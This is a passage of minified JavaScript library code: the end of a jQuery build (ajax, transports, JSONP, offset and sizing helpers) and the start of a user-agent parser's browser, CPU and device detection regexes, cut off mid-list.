                                        M = bv.event && J.global, M && 0 === bv.active++ && bv.event.trigger("ajaxStart"), J.type = J.type.toUpperCase(), J.hasContent = !aA.test(J.type), S = J.url.replace(cx, ""), J.hasContent ? J.data && J.processData && 0 === (J.contentType || "").indexOf("application/x-www-form-urlencoded") && (J.data = J.data.replace(cI, "+")) : (K = J.url.slice(S.length), J.data && (S += (aW.test(S) ? "&" : "?") + J.data, delete J.data), J.cache === !1 && (S = S.replace(aZ, "$1"), K = (aW.test(S) ? "&" : "?") + "_=" + a5++ + K), J.url = S + K), J.ifModified && (bv.lastModified[S] && d.setRequestHeader("If-Modified-Since", bv.lastModified[S]), bv.etag[S] && d.setRequestHeader("If-None-Match", bv.etag[S])), (J.data && J.hasContent && J.contentType !== !1 || U.contentType) && d.setRequestHeader("Content-Type", J.contentType), d.setRequestHeader("Accept", J.dataTypes[0] && J.accepts[J.dataTypes[0]] ? J.accepts[J.dataTypes[0]] + ("*" !== J.dataTypes[0] ? ", " + cC + "; q=0.01" : "") : J.accepts["*"]);
                                        for (L in J.headers) {
                                            d.setRequestHeader(L, J.headers[L])
                                        }
                                        if (J.beforeSend && (J.beforeSend.call(I, d, J) === !1 || N)) {
                                            return d.abort()
                                        }
                                        if (r = "abort", E.add(J.complete), d.done(J.success), d.fail(J.error), T = bj(cK, J, U, d)) {
                                            if (d.readyState = 1, M && G.trigger("ajaxSend", [d, J]), N) {
                                                return d
                                            }
                                            J.async && J.timeout > 0 && (P = bP.setTimeout(function() {
                                                d.abort("timeout")
                                            }, J.timeout));
                                            try {
                                                N = !1, T.send(C, H)
                                            } catch (a) {
                                                if (N) {
                                                    throw a
                                                }
                                                H(-1, a)
                                            }
                                        } else {
                                            H(-1, "No Transport")
                                        }

                                        function H(o, l, k, i) {
                                            var g, f, e, s, q, p = l;
                                            N || (N = !0, P && bP.clearTimeout(P), T = void 0, R = i || "", d.readyState = o > 0 ? 4 : 0, g = o >= 200 && o < 300 || 304 === o, k && (s = a3(J, d, k)), s = aU(J, s, d, g), g ? (J.ifModified && (q = d.getResponseHeader("Last-Modified"), q && (bv.lastModified[S] = q), q = d.getResponseHeader("etag"), q && (bv.etag[S] = q)), 204 === o || "HEAD" === J.type ? p = "nocontent" : 304 === o ? p = "notmodified" : (p = s.state, f = s.data, e = s.error, g = !e)) : (e = p, !o && p || (p = "error", o < 0 && (o = 0))), d.status = o, d.statusText = (l || p) + "", g ? F.resolveWith(I, [f, p, d]) : F.rejectWith(I, [d, p, e]), d.statusCode(D), D = void 0, M && G.trigger(g ? "ajaxSuccess" : "ajaxError", [d, J, g ? f : e]), E.fireWith(I, [d, p]), M && (G.trigger("ajaxComplete", [d, J]), --bv.active || bv.event.trigger("ajaxStop")))
                                        }
                                        return d
                                    },
                                    getJSON: function(e, d, f) {
                                        return bv.get(e, d, f, "json")
                                    },
                                    getScript: function(d, c) {
                                        return bv.get(d, void 0, c, "script")
                                    }
                                }), bv.each(["get", "post"], function(d, c) {
                                    bv[c] = function(b, h, g, f) {
                                        return bv.isFunction(h) && (f = f || g, g = h, h = void 0), bv.ajax(bv.extend({
                                            url: b,
                                            type: c,
                                            dataType: f,
                                            data: h,
                                            success: g
                                        }, bv.isPlainObject(b) && b))
                                    }
                                }), bv._evalUrl = function(b) {
                                    return bv.ajax({
                                        url: b,
                                        type: "GET",
                                        dataType: "script",
                                        cache: !0,
                                        async: !1,
                                        global: !1,
                                        "throws": !0
                                    })
                                }, bv.fn.extend({
                                    wrapAll: function(d) {
                                        var c;
                                        return this[0] && (bv.isFunction(d) && (d = d.call(this[0])), c = bv(d, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && c.insertBefore(this[0]), c.map(function() {
                                            var b = this;
                                            while (b.firstElementChild) {
                                                b = b.firstElementChild
                                            }
                                            return b
                                        }).append(this)), this
                                    },
                                    wrapInner: function(b) {
                                        return bv.isFunction(b) ? this.each(function(a) {
                                            bv(this).wrapInner(b.call(this, a))
                                        }) : this.each(function() {
                                            var a = bv(this),
                                                d = a.contents();
                                            d.length ? d.wrapAll(b) : a.append(b)
                                        })
                                    },
                                    wrap: function(d) {
                                        var c = bv.isFunction(d);
                                        return this.each(function(a) {
                                            bv(this).wrapAll(c ? d.call(this, a) : d)
                                        })
                                    },
                                    unwrap: function(b) {
                                        return this.parent(b).not("body").each(function() {
                                            bv(this).replaceWith(this.childNodes)
                                        }), this
                                    }
                                }), bv.expr.pseudos.hidden = function(b) {
                                    return !bv.expr.pseudos.visible(b)
                                }, bv.expr.pseudos.visible = function(b) {
                                    return !!(b.offsetWidth || b.offsetHeight || b.getClientRects().length)
                                }, bv.ajaxSettings.xhr = function() {
                                    try {
                                        return new bP.XMLHttpRequest
                                    } catch (a) {}
                                };
                                var aM = {
                                        0: 200,
                                        1223: 204
                                    },
                                    aE = bv.ajaxSettings.xhr();
                                bz.cors = !!aE && "withCredentials" in aE, bz.ajax = aE = !!aE, bv.ajaxTransport(function(a) {
                                    var f, e;
                                    if (bz.cors || aE && !a.crossDomain) {
                                        return {
                                            send: function(k, j) {
                                                var d, c = a.xhr();
                                                if (c.open(a.type, a.url, a.async, a.username, a.password), a.xhrFields) {
                                                    for (d in a.xhrFields) {
                                                        c[d] = a.xhrFields[d]
                                                    }
                                                }
                                                a.mimeType && c.overrideMimeType && c.overrideMimeType(a.mimeType), a.crossDomain || k["X-Requested-With"] || (k["X-Requested-With"] = "XMLHttpRequest");
                                                for (d in k) {
                                                    c.setRequestHeader(d, k[d])
                                                }
                                                f = function(g) {
                                                    return function() {
                                                        f && (f = e = c.onload = c.onerror = c.onabort = c.onreadystatechange = null, "abort" === g ? c.abort() : "error" === g ? "number" != typeof c.status ? j(0, "error") : j(c.status, c.statusText) : j(aM[c.status] || c.status, c.statusText, "text" !== (c.responseType || "text") || "string" != typeof c.responseText ? {
                                                            binary: c.response
                                                        } : {
                                                            text: c.responseText
                                                        }, c.getAllResponseHeaders()))
                                                    }
                                                }, c.onload = f(), e = c.onerror = f("error"), void 0 !== c.onabort ? c.onabort = e : c.onreadystatechange = function() {
                                                    4 === c.readyState && bP.setTimeout(function() {
                                                        f && e()
                                                    })
                                                }, f = f("abort");
                                                try {
                                                    c.send(a.hasContent && a.data || null)
                                                } catch (b) {
                                                    if (f) {
                                                        throw b
                                                    }
                                                }
                                            },
                                            abort: function() {
                                                f && f()
                                            }
                                        }
                                    }
                                }), bv.ajaxPrefilter(function(b) {
                                    b.crossDomain && (b.contents.script = !1)
                                }), bv.ajaxSetup({
                                    accepts: {
                                        script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
                                    },
                                    contents: {
                                        script: /\b(?:java|ecma)script\b/
                                    },
                                    converters: {
                                        "text script": function(b) {
                                            return bv.globalEval(b), b
                                        }
                                    }
                                }), bv.ajaxPrefilter("script", function(b) {
                                    void 0 === b.cache && (b.cache = !1), b.crossDomain && (b.type = "GET")
                                }), bv.ajaxTransport("script", function(e) {
                                    if (e.crossDomain) {
                                        var d, f;
                                        return {
                                            send: function(b, a) {
                                                d = bv("<script>").prop({
                                                    charset: e.scriptCharset,
                                                    src: e.url
                                                }).on("load error", f = function(c) {
                                                    d.remove(), f = null, c && a("error" === c.type ? 404 : 200, c.type)
                                                }), bM.head.appendChild(d[0])
                                            },
                                            abort: function() {
                                                f && f()
                                            }
                                        }
                                    }
                                });
                                var aw = [],
                                    an = /(=)\?(?=&|$)|\?\?/;
                                bv.ajaxSetup({
                                    jsonp: "callback",
                                    jsonpCallback: function() {
                                        var b = aw.pop() || bv.expando + "_" + a5++;
                                        return this[b] = !0, b
                                    }
                                }), bv.ajaxPrefilter("json jsonp", function(a, n, m) {
                                    var l, k, j, i = a.jsonp !== !1 && (an.test(a.url) ? "url" : "string" == typeof a.data && 0 === (a.contentType || "").indexOf("application/x-www-form-urlencoded") && an.test(a.data) && "data");
                                    if (i || "jsonp" === a.dataTypes[0]) {
                                        return l = a.jsonpCallback = bv.isFunction(a.jsonpCallback) ? a.jsonpCallback() : a.jsonpCallback, i ? a[i] = a[i].replace(an, "$1" + l) : a.jsonp !== !1 && (a.url += (aW.test(a.url) ? "&" : "?") + a.jsonp + "=" + l), a.converters["script json"] = function() {
                                            return j || bv.error(l + " was not called"), j[0]
                                        }, a.dataTypes[0] = "json", k = bP[l], bP[l] = function() {
                                            j = arguments
                                        }, m.always(function() {
                                            void 0 === k ? bv(bP).removeProp(l) : bP[l] = k, a[l] && (a.jsonpCallback = n.jsonpCallback, aw.push(l)), j && bv.isFunction(k) && k(j[0]), j = k = void 0
                                        }), "script"
                                    }
                                }), bz.createHTMLDocument = function() {
                                    var b = bM.implementation.createHTMLDocument("").body;
                                    return b.innerHTML = "<form></form><form></form>", 2 === b.childNodes.length
                                }(), bv.parseHTML = function(h, d, l) {
                                    if ("string" != typeof h) {
                                        return []
                                    }
                                    "boolean" == typeof d && (l = d, d = !1);
                                    var k, j, i;
                                    return d || (bz.createHTMLDocument ? (d = bM.implementation.createHTMLDocument(""), k = d.createElement("base"), k.href = bM.location.href, d.head.appendChild(k)) : d = bM), j = co.exec(h), i = !l && [], j ? [d.createElement(j[1])] : (j = bn([h], d, i), i && i.length && bv(i).remove(), bv.merge([], j.childNodes))
                                }, bv.fn.load = function(j, i, p) {
                                    var o, n, m, l = this,
                                        k = j.indexOf(" ");
                                    return k > -1 && (o = cE(j.slice(k)), j = j.slice(0, k)), bv.isFunction(i) ? (p = i, i = void 0) : i && "object" == typeof i && (n = "POST"), l.length > 0 && bv.ajax({
                                        url: j,
                                        type: n || "GET",
                                        dataType: "html",
                                        data: i
                                    }).done(function(b) {
                                        m = arguments, l.html(o ? bv("<div>").append(bv.parseHTML(b)).find(o) : b)
                                    }).always(p && function(d, c) {
                                        l.each(function() {
                                            p.apply(this, m || [d.responseText, c, d])
                                        })
                                    }), this
                                }, bv.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(d, c) {
                                    bv.fn[c] = function(b) {
                                        return this.on(c, b)
                                    }
                                }), bv.expr.pseudos.animated = function(b) {
                                    return bv.grep(bv.timers, function(a) {
                                        return b === a.elem
                                    }).length
                                };

                                function ae(b) {
                                    return bv.isWindow(b) ? b : 9 === b.nodeType && b.defaultView
                                }
                                bv.offset = {
                                    setOffset: function(z, y, x) {
                                        var w, v, u, t, s, r, q, p = bv.css(z, "position"),
                                            o = bv(z),
                                            n = {};
                                        "static" === p && (z.style.position = "relative"), s = o.offset(), u = bv.css(z, "top"), r = bv.css(z, "left"), q = ("absolute" === p || "fixed" === p) && (u + r).indexOf("auto") > -1, q ? (w = o.position(), t = w.top, v = w.left) : (t = parseFloat(u) || 0, v = parseFloat(r) || 0), bv.isFunction(y) && (y = y.call(z, x, bv.extend({}, s))), null != y.top && (n.top = y.top - s.top + t), null != y.left && (n.left = y.left - s.left + v), "using" in y ? y.using.call(z, n) : o.css(n)
                                    }
                                }, bv.fn.extend({
                                    offset: function(h) {
                                        if (arguments.length) {
                                            return void 0 === h ? this : this.each(function(a) {
                                                bv.offset.setOffset(this, h, a)
                                            })
                                        }
                                        var g, l, k, j, i = this[0];
                                        if (i) {
                                            return i.getClientRects().length ? (k = i.getBoundingClientRect(), k.width || k.height ? (j = i.ownerDocument, l = ae(j), g = j.documentElement, {
                                                top: k.top + l.pageYOffset - g.clientTop,
                                                left: k.left + l.pageXOffset - g.clientLeft
                                            }) : k) : {
                                                top: 0,
                                                left: 0
                                            }
                                        }
                                    },
                                    position: function() {
                                        if (this[0]) {
                                            var f, e, h = this[0],
                                                g = {
                                                    top: 0,
                                                    left: 0
                                                };
                                            return "fixed" === bv.css(h, "position") ? e = h.getBoundingClientRect() : (f = this.offsetParent(), e = this.offset(), bv.nodeName(f[0], "html") || (g = f.offset()), g = {
                                                top: g.top + bv.css(f[0], "borderTopWidth", !0),
                                                left: g.left + bv.css(f[0], "borderLeftWidth", !0)
                                            }), {
                                                top: e.top - g.top - bv.css(h, "marginTop", !0),
                                                left: e.left - g.left - bv.css(h, "marginLeft", !0)
                                            }
                                        }
                                    },
                                    offsetParent: function() {
                                        return this.map(function() {
                                            var b = this.offsetParent;
                                            while (b && "static" === bv.css(b, "position")) {
                                                b = b.offsetParent
                                            }
                                            return b || bf
                                        })
                                    }
                                }), bv.each({
                                    scrollLeft: "pageXOffset",
                                    scrollTop: "pageYOffset"
                                }, function(e, d) {
                                    var f = "pageYOffset" === d;
                                    bv.fn[e] = function(a) {
                                        return b2(this, function(b, h, g) {
                                            var c = ae(b);
                                            return void 0 === g ? c ? c[d] : b[h] : void(c ? c.scrollTo(f ? c.pageXOffset : g, f ? g : c.pageYOffset) : b[h] = g)
                                        }, e, a, arguments.length)
                                    }
                                }), bv.each(["top", "left"], function(d, c) {
                                    bv.cssHooks[c] = aN(bz.pixelPosition, function(b, e) {
                                        if (e) {
                                            return e = aV(b, c), bd.test(e) ? bv(b).position()[c] + "px" : e
                                        }
                                    })
                                }), bv.each({
                                    Height: "height",
                                    Width: "width"
                                }, function(d, c) {
                                    bv.each({
                                        padding: "inner" + d,
                                        content: c,
                                        "": "outer" + d
                                    }, function(b, a) {
                                        bv.fn[a] = function(l, k) {
                                            var j = arguments.length && (b || "boolean" != typeof l),
                                                i = b || (l === !0 || k === !0 ? "margin" : "border");
                                            return b2(this, function(g, n, m) {
                                                var h;
                                                return bv.isWindow(g) ? 0 === a.indexOf("outer") ? g["inner" + d] : g.document.documentElement["client" + d] : 9 === g.nodeType ? (h = g.documentElement, Math.max(g.body["scroll" + d], h["scroll" + d], g.body["offset" + d], h["offset" + d], h["client" + d])) : void 0 === m ? bv.css(g, n, i) : bv.style(g, n, m, i)
                                            }, c, j ? l : void 0, j)
                                        }
                                    })
                                }), bv.fn.extend({
                                    bind: function(e, d, f) {
                                        return this.on(e, null, d, f)
                                    },
                                    unbind: function(d, c) {
                                        return this.off(d, null, c)
                                    },
                                    delegate: function(f, e, h, g) {
                                        return this.on(e, f, h, g)
                                    },
                                    undelegate: function(e, d, f) {
                                        return 1 === arguments.length ? this.off(e, "**") : this.off(d, e || "**", f)
                                    }
                                }), bv.parseJSON = JSON.parse, "function" == typeof define && define.amd && define("jquery", [], function() {
                                    return bv
                                });
                                var cG = bP.jQuery,
                                    cv = bP.$;
                                return bv.noConflict = function(a) {
                                    return bP.$ === bv && (bP.$ = cv), a && bP.jQuery === bv && (bP.jQuery = cG), bv
                                }, bO || (bP.jQuery = bP.$ = bv), bv
                            });
                            (function(ab, J) {
                                var R = "0.7.12",
                                    O = "",
                                    X = "?",
                                    K = "function",
                                    Q = "undefined",
                                    H = "object",
                                    af = "string",
                                    aa = "major",
                                    V = "model",
                                    ad = "name",
                                    Y = "type",
                                    P = "vendor",
                                    ac = "version",
                                    G = "architecture",
                                    U = "console",
                                    Z = "mobile",
                                    B = "tablet",
                                    ae = "smarttv",
                                    F = "wearable",
                                    I = "embedded",
                                    q = {
                                        extend: function(c, a) {
                                            var d = {};
                                            for (var b in c) {
                                                a[b] && a[b].length % 2 === 0 ? d[b] = a[b].concat(c[b]) : d[b] = c[b]
                                            }
                                            return d
                                        },
                                        has: function(b, a) {
                                            return typeof b == "string" ? a.toLowerCase().indexOf(b.toLowerCase()) !== -1 : !1
                                        },
                                        lowerize: function(a) {
                                            return a.toLowerCase()
                                        },
                                        major: function(a) {
                                            return typeof a === af ? a.replace(/[^\d\.]/g, "").split(".")[0] : J
                                        },
                                        trim: function(a) {
                                            return a.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "")
                                        }
                                    },
                                    D = {
                                        rgx: function() {
                                            var u, k = 0,
                                                b, o, x, t, m, w, s = arguments;
                                            while (k < s.length && !m) {
                                                var g = s[k],
                                                    v = s[k + 1];
                                                if (typeof u === Q) {
                                                    u = {};
                                                    for (x in v) {
                                                        v.hasOwnProperty(x) && (t = v[x], typeof t === H ? u[t[0]] = J : u[t] = J)
                                                    }
                                                }
                                                b = o = 0;
                                                while (b < g.length && !m) {
                                                    m = g[b++].exec(this.getUA());
                                                    if (!!m) {
                                                        for (x = 0; x < v.length; x++) {
                                                            w = m[++o], t = v[x], typeof t === H && t.length > 0 ? t.length == 2 ? typeof t[1] == K ? u[t[0]] = t[1].call(this, w) : u[t[0]] = t[1] : t.length == 3 ? typeof t[1] === K && (!t[1].exec || !t[1].test) ? u[t[0]] = w ? t[1].call(this, w, t[2]) : J : u[t[0]] = w ? w.replace(t[1], t[2]) : J : t.length == 4 && (u[t[0]] = w ? t[3].call(this, w.replace(t[1], t[2])) : J) : u[t] = w ? w : J
                                                        }
                                                    }
                                                }
                                                k += 2
                                            }
                                            return u
                                        },
                                        str: function(c, d) {
                                            for (var b in d) {
                                                if (typeof d[b] === H && d[b].length > 0) {
                                                    for (var a = 0; a < d[b].length; a++) {
                                                        if (q.has(d[b][a], c)) {
                                                            return b === X ? J : b
                                                        }
                                                    }
                                                } else {
                                                    if (q.has(d[b], c)) {
                                                        return b === X ? J : b
                                                    }
                                                }
                                            }
                                            return c
                                        }
                                    },
                                    j = {
                                        browser: {
                                            oldsafari: {
                                                version: {
                                                    "1.0": "/8",
                                                    1.2: "/1",
                                                    1.3: "/3",
                                                    "2.0": "/412",
                                                    "2.0.2": "/416",
                                                    "2.0.3": "/417",
                                                    "2.0.4": "/419",
                                                    "?": "/"
                                                }
                                            }
                                        },
                                        device: {
                                            amazon: {
                                                model: {
                                                    "Fire Phone": ["SD", "KF"]
                                                }
                                            },
                                            sprint: {
                                                model: {
                                                    "Evo Shift 4G": "7373KT"
                                                },
                                                vendor: {
                                                    HTC: "APA",
                                                    Sprint: "Sprint"
                                                }
                                            }
                                        },
                                        os: {
                                            windows: {
                                                version: {
                                                    ME: "4.90",
                                                    "NT 3.11": "NT3.51",
                                                    "NT 4.0": "NT4.0",
                                                    2000: "NT 5.0",
                                                    XP: ["NT 5.1", "NT 5.2"],
                                                    Vista: "NT 6.0",
                                                    7: "NT 6.1",
                                                    8: "NT 6.2",
                                                    8.1: "NT 6.3",
                                                    10: ["NT 6.4", "NT 10.0"],
                                                    RT: "ARM"
                                                }
                                            }
                                        }
                                    },
                                    z = {
                                        browser: [
                                            [/(opera\smini)\/([\w\.-]+)/i, /(opera\s[mobiletab]+).+version\/([\w\.-]+)/i, /(opera).+version\/([\w\.]+)/i, /(opera)[\/\s]+([\w\.]+)/i],
                                            [ad, ac],
                                            [/(opios)[\/\s]+([\w\.]+)/i],
                                            [
                                                [ad, "Opera Mini"], ac
                                            ],
                                            [/\s(opr)\/([\w\.]+)/i],
                                            [
                                                [ad, "Opera"], ac
                                            ],
                                            [/(kindle)\/([\w\.]+)/i, /(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?([\w\.]+)*/i, /(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?([\w\.]*)/i, /(?:ms|\()(ie)\s([\w\.]+)/i, /(rekonq)\/([\w\.]+)*/i, /(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs)\/([\w\.-]+)/i],
                                            [ad, ac],
                                            [/(trident).+rv[:\s]([\w\.]+).+like\sgecko/i],
                                            [
                                                [ad, "IE"], ac
                                            ],
                                            [/(edge)\/((\d+)?[\w\.]+)/i],
                                            [ad, ac],
                                            [/(yabrowser)\/([\w\.]+)/i],
                                            [
                                                [ad, "Yandex"], ac
                                            ],
                                            [/(comodo_dragon)\/([\w\.]+)/i],
                                            [
                                                [ad, /_/g, " "], ac
                                            ],
                                            [/(micromessenger)\/([\w\.]+)/i],
                                            [
                                                [ad, "WeChat"], ac
                                            ],
                                            [/xiaomi\/miuibrowser\/([\w\.]+)/i],
                                            [ac, [ad, "MIUI Browser"]],
                                            [/\swv\).+(chrome)\/([\w\.]+)/i],
                                            [
                                                [ad, /(.+)/, "$1 WebView"], ac
                                            ],
                                            [/android.+samsungbrowser\/([\w\.]+)/i, /android.+version\/([\w\.]+)\s+(?:mobile\s?safari|safari)*/i],
                                            [ac, [ad, "Android Browser"]],
                                            [/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?([\w\.]+)/i, /(qqbrowser)[\/\s]?([\w\.]+)/i],
                                            [ad, ac],
                                            [/(uc\s?browser)[\/\s]?([\w\.]+)/i, /ucweb.+(ucbrowser)[\/\s]?([\w\.]+)/i, /juc.+(ucweb)[\/\s]?([\w\.]+)/i],
                                            [
                                                [ad, "UCBrowser"], ac
                                            ],
                                            [/(dolfin)\/([\w\.]+)/i],
                                            [
                                                [ad, "Dolphin"], ac
                                            ],
                                            [/((?:android.+)crmo|crios)\/([\w\.]+)/i],
                                            [
                                                [ad, "Chrome"], ac
                                            ],
                                            [/;fbav\/([\w\.]+);/i],
                                            [ac, [ad, "Facebook"]],
                                            [/fxios\/([\w\.-]+)/i],
                                            [ac, [ad, "Firefox"]],
                                            [/version\/([\w\.]+).+?mobile\/\w+\s(safari)/i],
                                            [ac, [ad, "Mobile Safari"]],
                                            [/version\/([\w\.]+).+?(mobile\s?safari|safari)/i],
                                            [ac, ad],
                                            [/webkit.+?(mobile\s?safari|safari)(\/[\w\.]+)/i],
                                            [ad, [ac, D.str, j.browser.oldsafari.version]],
                                            [/(konqueror)\/([\w\.]+)/i, /(webkit|khtml)\/([\w\.]+)/i],
                                            [ad, ac],
                                            [/(navigator|netscape)\/([\w\.-]+)/i],
                                            [
                                                [ad, "Netscape"], ac
                                            ],
                                            [/(swiftfox)/i, /(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?([\w\.\+]+)/i, /(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix)\/([\w\.-]+)/i, /(mozilla)\/([\w\.]+).+rv\:.+gecko\/\d+/i, /(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir)[\/\s]?([\w\.]+)/i, /(links)\s\(([\w\.]+)/i, /(gobrowser)\/?([\w\.]+)*/i, /(ice\s?browser)\/v?([\w\._]+)/i, /(mosaic)[\/\s]([\w\.]+)/i],
                                            [ad, ac]
                                        ],
                                        cpu: [
                                            [/(?:(amd|x(?:(?:86|64)[_-])?|wow|win)64)[;\)]/i],
                                            [
                                                [G, "amd64"]
                                            ],
                                            [/(ia32(?=;))/i],
                                            [
                                                [G, q.lowerize]
                                            ],
                                            [/((?:i[346]|x)86)[;\)]/i],
                                            [
                                                [G, "ia32"]
                                            ],
                                            [/windows\s(ce|mobile);\sppc;/i],
                                            [
                                                [G, "arm"]
                                            ],
                                            [/((?:ppc|powerpc)(?:64)?)(?:\smac|;|\))/i],
                                            [
                                                [G, /ower/, "", q.lowerize]
                                            ],
                                            [/(sun4\w)[;\)]/i],
                                            [
                                                [G, "sparc"]
                                            ],
                                            [/((?:avr32|ia64(?=;))|68k(?=\))|arm(?:64|(?=v\d+;))|(?=atmel\s)avr|(?:irix|mips|sparc)(?:64)?(?=;)|pa-risc)/i],
                                            [
                                                [G, q.lowerize]
                                            ]
                                        ],
                                        device: [
                                            [/\((ipad|playbook);[\w\s\);-]+(rim|apple)/i],
                                            [V, P, [Y, B]],
                                            [/applecoremedia\/[\w\.]+ \((ipad)/],
                                            [V, [P, "Apple"],
                                                [Y, B]
                                            ],
                                            [/(apple\s{0,1}tv)/i],
                                            [
                                                [V, "Apple TV"],
                                                [P, "Apple"]
                                            ],
                                            [/(archos)\s(gamepad2?)/i, /(hp).+(touchpad)/i, /(hp).+(tablet)/i, /(kindle)\/([\w\.]+)/i, /\s(nook)[\w\s]+build\/(\w+)/i, /(dell)\s(strea[kpr\s\d]*[\dko])/i],
                                            [P, V, [Y, B]],
                                            [/(kf[A-z]+)\sbuild\/[\w\.]+.*silk\//i],
                                            [V, [P, "Amazon"],
                                                [Y, B]
                                            ],
                                            [/(sd|kf)[0349hijorstuw]+\sbuild\/[\w\.]+.*silk\//i],
                                            [
                                                [V, D.str, j.device.amazon.model],
                                                [P, "Amazon"],
                                                [Y, Z]
                                            ],
                                            [/\((ip[honed|\s\w*]+);.+(apple)/i],
                                            [V, P, [Y, Z]],
                                            [/\((ip[honed|\s\w*]+);/i],
                                            [V, [P, "Apple"],
                                                [Y, Z]
                                            ],
                                            [/(blackberry)[\s-]?(\w+)/i, /(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|huawei|meizu|motorola|polytron)[\s_-]?([\w-]+)*/i, /(hp)\s([\w\s]+\w)/i, /(asus)-?(\w+)/i],
                                            [P, V, [Y, Z]],
                                            [/\(bb10;\s(\w+)/i],
                                            [V, [P, "BlackBerry"],
                                                [Y, Z]
                                            ],
                                            [/android.+(transfo[prime\s]{4,10}\s\w+|eeepc|slider\s\w+|nexus 7|padfone)/i],
                                            [V, [P, "Asus"],
                                                [Y, B]
                                            ],
                                            [/(sony)\s(tablet\s[ps])\sbuild\//i, /(sony)?(?:sgp.+)\sbuild\//i],
                                            [
                                                [P, "Sony"],
                                                [V, "Xperia Tablet"],
                                                [Y, B]
                                            ],
                                            [/(?:sony)?(?:(?:(?:c|d)\d{4})|(?:so[-l].+))\sbuild\//i],
                                            [
                                                [P, "Sony"],
                                                [V, "Xperia Phone"],
                                                [Y, Z]
                                            ],
                                            [/\s(ouya)\s/i, /(nintendo)\s([wids3u]+)/i],
                                            [P, V, [Y, U]],
                                            [/android.+;\s(shield)\sbuild/i],
                                            [V, [P, "Nvidia"],
                                                [Y, U]
                                            ],
                                            [/(playstation\s[34portablevi]+)/i],
                                            [V, [P, "Sony"],
                                                [Y, U]
                                            ],
                                            [/(sprint\s(\w+))/i],
                                            [
                                                [P, D.str, j.device.sprint.vendor],
                                                [V, D.str, j.device.sprint.model],
                                                [Y, Z]
                                            ],
                                            [/(lenovo)\s?(S(?:5000|6000)+(?:[-][\w+]))/i],
                                            [P, V, [Y, B]],
                                            [/(htc)[;_\s-]+([\w\s]+(?=\))|\w+)*/i, /(zte)-(\w+)*/i, /(alcatel|geeksphone|huawei|lenovo|nexian|panasonic|(?=;\s)sony)[_\s-]?([\w-]+)*/i],
                                            [P, [V, /_/g, " "],
                                                [Y, Z]
                                            ],
                                            [/(nexus\s9)/i],
                                            [V, [P, "HTC"],
                                                [Y, B]
                                            ],
                                            [/(nexus\s6p)/i],
                                            [V, [P, "Huawei"],
                                                [Y, Z]
                                            ],
                                            [/(microsoft);\s(lumia[\s\w]+)/i],
                                            [P, V, [Y, Z]],
                                            [/[\s\(;](xbox(?:\sone)?)[\s\);]/i],
                                            [V, [P, "Microsoft"],
                                                [Y, U]
                                            ],
                                            [/(kin\.[onetw]{3})/i],
                                            [
                                                [V, /\./g, " "],
                                                [P, "Microsoft"],
                                                [Y, Z]
                                            ],
                                            [/\s(milestone|droid(?:[2-4x]|\s(?:bionic|x2|pro|razr))?(:?\s4g)?)[\w\s]+build\//i, /mot[\s-]?(\w+)*/i, /(XT\d{3,4}) build\//i, /(nexus\s6)/i],
                                            [V, [P, "Motorola"],
                                                [Y, Z]
                                            ],
                                            [/android.+\s(mz60\d|xoom[\s2]{0,2})\sbuild\//i],
                                            [V, [P, "Motorola"],
                                                [Y, B]
                                            ],
                                            [/hbbtv\/\d+\.\d+\.\d+\s+\([\w\s]*;\s*(\w[^;]*);([^;]*)/i],
                                            [
                                                [P, q.trim],
                                                [V, q.trim],
                                                [Y, ae]
                                            ],
                                            [/hbbtv.+maple;(\d+)/i],
                                            [
                                                [V, /^/, "SmartTV"],
                                                [P, "Samsung"],
                                                [Y, ae]
                                            ],
                                            [/\(dtv[\);].+(aquos)/i],
                                            [V, [P, "Sharp"],
                                                [Y, ae]
                                            ],
                                            [/android.+((sch-i[89]0\d|shw-m380s|gt-p\d{4}|gt-n\d+|sgh-t8[56]9|nexus 10))/i, /((SM-T\w+))/i],
                                            [
                                                [P, "Samsung"], V, [Y, B]
                                            ],
                                            [/smart-tv.+(samsung)/i],
                                            [P, [Y, ae], V],
                                            [/((s[cgp]h-\w+|gt-\w+|galaxy\snexus|sm-\w[\w\d]+))/i, /(sam[sung]*)[\s-]*(\w+-?[\w-]*)*/i, /sec-((sgh\w+))/i],
                                            [
                                                [P, "Samsung"], V, [Y, Z]
                                            ],
                                            [/sie-(\w+)*/i],
                                            [V, [P, "Siemens"],
                                                [Y, Z]
                                            ],
                                            [/(maemo|nokia).*(n900|lumia\s\d+)/i, /(nokia)[\s_-]?([\w-]+)*/i],
                                            [
                                                [P, "Nokia"], V, [Y, Z]
                                            ],
                                            [/android\s3\.[\s\w;-]{10}(a\d{3})/i],
                                            [V, [P, "Acer"],
                                                [Y, B]
                                            ],
                                            [/android\s3\.[\s\w;-]{10}(lg?)-([06cv9]{3,4})/i],
                                            [
                                                [P, "LG"], V, [Y, B]
                                            ],
                                            [/(lg) netcast\.tv/i],
                                            [P, V, [Y, ae]],
                                            [/(nexus\s[45])/i, /lg[e;\s\/-]+(\w+)*/i],
                                            [V, [P, "LG"],
                                                [Y, Z]
                                            ],
                                            [/android.+(ideatab[a-z0-9\-\s]+)/i],
                                            [V, [P, "Lenovo"],
                                                [Y, B]
                                            ],
                                            [/linux;.+((jolla));/i],
                                            [P, V, [Y, Z]],
                                            [/((pebble))app\/[\d\.]+\s/i],
                                            [P, V, [Y, F]],
                                            [/android.+;\s(glass)\s\d/i],
                                            [V, [P, "Google"],
                                                [Y, F]
                                            ],
                                            [/android.+(\w+)\s+build\/hm\1/i, /android.+(hm[\s\-_]*note?[\s_]*(?:\d\w)?)\s+build/i, /android.+(mi[\s\-_]*(?:one|one[\s_]plus|note lte)?[\s_]*(?:\d\w)?)\s+build/i],
                                            [
                                                [V, /_/g, " "],
                                                [P, "Xiaomi"],
                                                [Y, Z]
                                            ],
                                            [/android.+a000(1)\s+build/i],
